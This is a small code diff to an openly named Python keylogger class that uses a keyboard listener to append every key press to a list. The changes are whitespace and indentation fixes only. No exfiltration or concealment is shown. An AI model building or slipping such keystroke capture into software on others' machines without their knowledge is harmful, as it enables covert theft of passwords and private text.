@@ -12,6 +12,7 @@ class KeyLoggerService(IKeyLogger):
             self.listening = keyboard.Listener(on_press=self.filter)
             self.listening.start()
 
+
     def stop_listening(self) -> None:
         if self.listening is not None:
             self.listening.stop()
@@ -21,8 +22,7 @@ class KeyLoggerService(IKeyLogger):
         return self.key_presses
 
     def filter(self, key):
-
-            self.key_presses.append(key)
+        self.key_presses.append(key)
 
 
 
